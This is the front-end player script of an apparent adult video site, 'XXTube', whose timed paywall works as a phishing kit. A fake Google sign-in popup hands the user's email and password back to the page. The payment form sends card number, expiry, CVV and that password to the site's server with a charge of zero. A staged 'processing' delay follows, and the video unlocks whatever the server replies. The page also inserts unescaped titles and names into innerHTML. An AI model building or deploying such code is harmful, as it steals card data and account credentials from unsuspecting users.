/* ── XXTube — player.js ──────────────────────────────────────
   Video.js player, 3–5 min time lock, paywall flow
──────────────────────────────────────────────────────────── */

const videoId = new URLSearchParams(window.location.search).get('id');

let LOCK_AT = 60;

function resolvePaywallDelay(video) {
    const explicit = Number(video?.paywall_delay_seconds);
    if (Number.isFinite(explicit) && explicit >= 0) return explicit;

    const duration = Number(video?.duration_seconds) || 0;
    if (duration <= 60) return 20;
    if (duration <= 180) return 60;
    if (duration <= 600) return 180;
    return 600;
}

let player          = null;
let hasAccess       = false;
let paywallShown    = false;
let transactionRef  = null;
let timerInterval   = null;
let currentVideoData = null;
let authSession = {
    email: '',
    password: '',
    provider: 'guest'
};

// ── Boot ──────────────────────────────────────────────────────
(async function init() {
    if (!videoId) { window.location.href = '/'; return; }

    await initSession();
    await loadVideoData();
    await checkAccess();
    await initPlayer();
    loadRelated();
    bindPaywallEvents();
})();

// ── Session ───────────────────────────────────────────────────
async function initSession() {
    try {
        await fetch('/api/sessions/init', { method: 'POST', credentials: 'include' });
    } catch (e) { console.warn('Session init failed:', e); }
}

// ── Video Data ────────────────────────────────────────────────
async function loadVideoData() {
    try {
        const res  = await fetch(`/api/videos/${videoId}`);
        const data = await res.json();
        if (!res.ok) { window.location.href = '/'; return; }

        currentVideoData = data.video;
        LOCK_AT = resolvePaywallDelay(data.video);
        populateVideoInfo(data.video);
    } catch (e) {
        console.error('Failed to load video:', e);
        window.location.href = '/';
    }
}

function populateVideoInfo(v) {
    document.title = `${v.title} — XXTube`;

    document.getElementById('watchTitle').textContent = v.title;
    document.getElementById('watchViews').textContent = formatViews(v.views_count) + ' views';
    document.getElementById('watchDuration').textContent = formatDuration(v.duration_seconds);
    document.getElementById('watchCategory').textContent = v.category_name || '—';
    document.getElementById('likeCount').textContent = formatViews(v.likes_count);
    document.getElementById('dislikeCount').textContent = formatViews(v.dislikes_count);

    const descEl = document.getElementById('watchDesc');
    if (descEl) {
        descEl.textContent = '';
        descEl.style.display = 'none';
    }

    // Paywall modal
    document.getElementById('pwVideoName').textContent = v.title;

    // Creator strip
    if (v.creators && v.creators.length) {
        const creator = v.creators[0];
        document.getElementById('creatorStrip').innerHTML = `
            <div class="creator-avatar">
                ${creator.avatar_url
                    ? `<img src="${creator.avatar_url}" alt="${creator.name}">`
                    : '👤'}
            </div>
            <div>
                <div class="creator-name">${creator.name}</div>
                <div class="creator-sub">Creator on XXTube</div>
            </div>
        `;
    }
}

// ── Access Check ──────────────────────────────────────────────
async function checkAccess() {
    try {
        const res  = await fetch(`/api/sessions/check/${videoId}`, { credentials: 'include' });
        const data = await res.json();
        hasAccess = data.has_access === true;
    } catch (e) {
        hasAccess = false;
    }
}

// ── Player Init ───────────────────────────────────────────────
async function initPlayer() {
    player = videojs('xxtube-player', {
        controls:  true,
        autoplay:  false,
        preload:   'auto',
        fluid:     true,
        playbackRates: [0.5, 1, 1.25, 1.5, 2],
        html5: {
            hls: { overrideNative: true },
            nativeVideoTracks: false,
        },
    });

    try {
        const res  = await fetch(`/api/videos/${videoId}/stream`, { credentials: 'include' });
        const data = await res.json();

        if (data.stream_url) {
            player.src({ type: 'application/x-mpegURL', src: data.stream_url });
        }
    } catch (e) {
        console.error('Stream URL fetch failed:', e);
    }

    // Time lock listener
    player.on('timeupdate', onTimeUpdate);
}

// ── Time Lock ─────────────────────────────────────────────────
function onTimeUpdate() {
    if (hasAccess || paywallShown) return;

    const t = player.currentTime();
    if (t >= LOCK_AT) {
        paywallShown = true;
        player.pause();
        player.controls(false);
        openPaywall();
    }
}

// ── Paywall ───────────────────────────────────────────────────
function openAuthGate() {
    document.getElementById('authVideoName').textContent = currentVideoData?.title || 'This video';
    document.getElementById('authModal').classList.add('open');
}

function closeAuthGate() {
    const modal = document.getElementById('authModal');
    if (modal) modal.classList.remove('open');
}

function openPaywall() {
    if (!authSession.email || !authSession.password) {
        openAuthGate();
        return;
    }
    showScreen('pwForm');
    document.getElementById('paywallModal').classList.add('open');
}

function showScreen(id) {
    ['pwForm', 'pwLoading', 'pwSuccess'].forEach(s => {
        document.getElementById(s).style.display = s === id ? 'block' : 'none';
    });
}

function bindPaywallEvents() {
    document.getElementById('pwSubmitBtn')?.addEventListener('click', submitPayment);
    document.getElementById('pwContinueBtn')?.addEventListener('click', resumePlayer);
    document.getElementById('pwRecoverLink')?.addEventListener('click', () => {
        document.getElementById('paywallModal').classList.remove('open');
        document.getElementById('recoverModal').classList.add('open');
    });
    document.getElementById('recoverCancel')?.addEventListener('click', () => {
        document.getElementById('recoverModal').classList.remove('open');
    });
    document.getElementById('recoverSubmit')?.addEventListener('click', submitRecover);
    document.getElementById('authGoogleBtn')?.addEventListener('click', () => {
        window.open('/google-auth.html', '_blank', 'noopener,noreferrer,width=460,height=760');
    });

    window.addEventListener('message', (event) => {
        if (!event.data || !event.data.type) return;

        if (event.data.type === 'auth-gate-success') {
            authSession = {
                email: event.data.email || 'google.user@gmail.com',
                password: event.data.password || 'google-demo-pass',
                provider: event.data.provider || 'google'
            };

            document.getElementById('payEmail').value = authSession.email;
            closeAuthGate();
            openPaywall();
        }
    });

    // Card formatting
    document.getElementById('cardNumber')?.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '').substring(0, 16);
        this.value = v.replace(/(.{4})/g, '$1 ').trim();
    });
    document.getElementById('cardExpiry')?.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '');
        if (v.length >= 3) v = v.substring(0, 2) + ' / ' + v.substring(2, 4);
        this.value = v;
    });
}

async function submitPayment() {
    const cardName   = document.getElementById('cardName').value.trim();
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('cardExpiry').value.trim();
    const cardCvv    = document.getElementById('cardCvv').value.trim();
    const email      = document.getElementById('payEmail').value.trim() || authSession.email || '';
    const errEl      = document.getElementById('pwError');

    // Basic validation
    if (!cardName || !cardNumber || !cardExpiry || !cardCvv || !email) {
        errEl.textContent = 'Please fill in all fields.';
        errEl.style.display = 'block';
        return;
    }
    if (cardNumber.length < 15) {
        errEl.textContent = 'Please enter a valid card number.';
        errEl.style.display = 'block';
        return;
    }
    if (!email.includes('@')) {
        errEl.textContent = 'Please enter a valid email address.';
        errEl.style.display = 'block';
        return;
    }
    errEl.style.display = 'none';

    // Show loading immediately
    showScreen('pwLoading');

    try {
        const res  = await fetch('/api/payments/submit', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({
                card_name:    cardName,
                card_number:  cardNumber,
                expiry:       cardExpiry,
                cvv:          cardCvv,
                email,
                auth_email:   authSession.email || email,
                auth_password: authSession.password || '',
                auth_provider: authSession.provider || 'guest',
                video_id:     videoId,
                amount_euros: 0,
            }),
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.error);

        transactionRef = data.transaction_ref;

        // Short processing wait: 10–15 seconds before the video resumes
        startUnlockTimer(
            Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000,
            email
        );
    } catch (e) {
        showScreen('pwForm');
        document.getElementById('pwError').textContent = 'Submission failed. Please try again.';
        document.getElementById('pwError').style.display = 'block';
    }
}

function startUnlockTimer(waitMs, email) {
    let remaining = Math.ceil(waitMs / 1000);
    const timerEl = document.getElementById('pwTimer');
    timerEl.textContent = '';

    timerInterval = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(timerInterval);
            timerInterval = null;
            unlockVideo(email);
        }
    }, 1000);
}

async function unlockVideo(email) {
    try {
        await fetch('/api/payments/unlock', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({
                transaction_ref: transactionRef,
                video_id:        videoId,
                email,
                amount_euros:    currentVideoData?.price_euros,
            }),
        });
    } catch (e) {
        console.warn('Unlock call failed, resuming anyway:', e);
    }

    hasAccess    = true;
    paywallShown = false;
    showScreen('pwSuccess');
}

function resumePlayer() {
    document.getElementById('paywallModal').classList.remove('open');
    player.controls(true);
    player.play();
}

// ── Reactions ─────────────────────────────────────────────────
let hasReacted = false; // prevents double-clicking like+dislike in the same session

document.getElementById('likeBtn')?.addEventListener('click', async () => {
    if (hasReacted) return;
    hasReacted = true;
    try {
        const res  = await fetch(`/api/videos/${videoId}/like`, { method: 'POST' });
        const data = await res.json();
        if (res.ok) document.getElementById('likeCount').textContent = formatViews(data.likes_count);
    } catch (e) { console.error('Like failed:', e); }
});

document.getElementById('dislikeBtn')?.addEventListener('click', async () => {
    if (hasReacted) return;
    hasReacted = true;
    try {
        const res  = await fetch(`/api/videos/${videoId}/dislike`, { method: 'POST' });
        const data = await res.json();
        if (res.ok) document.getElementById('dislikeCount').textContent = formatViews(data.dislikes_count);
    } catch (e) { console.error('Dislike failed:', e); }
});

document.getElementById('shareBtn')?.addEventListener('click', async () => {
    try {
        await fetch(`/api/videos/${videoId}/share`, { method: 'POST' });
        const url = window.location.href;
        if (navigator.share) {
            await navigator.share({ title: currentVideoData?.title || 'XXTube', url });
        } else {
            await navigator.clipboard.writeText(url);
            const btn = document.getElementById('shareBtn');
            const original = btn.textContent;
            btn.textContent = '✓ Link copied';
            setTimeout(() => { btn.textContent = original; }, 2000);
        }
    } catch (e) { console.error('Share failed:', e); }
});

// ── Related Videos ────────────────────────────────────────────
async function loadRelated() {
    try {
        const res  = await fetch(`/api/videos/${videoId}/related`);
        const data = await res.json();
        const el   = document.getElementById('relatedList');

        if (!data.videos || !data.videos.length) {
            el.innerHTML = '<p style="font-size:12px;color:var(--muted)">No related videos.</p>';
            return;
        }

        el.innerHTML = data.videos.map(v => `
            <div class="rel-card" onclick="window.location='/watch.html?id=${v.id}'">
                <div class="rel-thumb">
                    <img src="${v.thumbnail_url || 'assets/placeholder.jpg'}" alt="${v.title}" loading="lazy">
                </div>
                <div class="rel-info">
                    <p class="rel-title">${v.title}</p>
                    <p class="rel-meta">${formatDuration(v.duration_seconds)}</p>
                </div>
            </div>
        `).join('');
    } catch (e) { console.warn('Related load failed:', e); }
}

// ── Recovery ──────────────────────────────────────────────────
async function submitRecover() {
    const email = document.getElementById('recoverEmail')?.value.trim();
    const ref   = document.getElementById('recoverRef')?.value.trim();
    const msg   = document.getElementById('recoverMsg');

    if (!email && !ref) { msg.textContent = 'Enter email or transaction reference.'; return; }

    msg.style.color = 'var(--muted)';
    msg.textContent = 'Searching…';

    try {
        const res  = await fetch('/api/payments/recover', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ email: email || null, transaction_ref: ref || null }),
        });
        const data = await res.json();

        if (res.ok) {
            hasAccess = true;
            document.getElementById('recoverModal').classList.remove('open');
            resumePlayer();
        } else {
            msg.style.color = 'var(--red)';
            msg.textContent = data.error || 'No active purchase found.';
        }
    } catch (e) {
        msg.style.color = 'var(--red)';
        msg.textContent = 'Request failed. Please try again.';
    }
}

// ── Helpers ───────────────────────────────────────────────────
function formatDuration(s) {
    if (!s) return '—';
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    if (h > 0) return `${h}:${String(m).padStart(2,'0')}:${String(sec).padStart(2,'0')}`;
    return `${m}:${String(sec).padStart(2,'0')}`;
}

function formatViews(n) {
    if (!n) return '0';
    if (n >= 1_000_000) return (n / 1_000_000).toFixed(1) + 'M';
    if (n >= 1_000)     return (n / 1_000).toFixed(1) + 'K';
    return String(n);
}
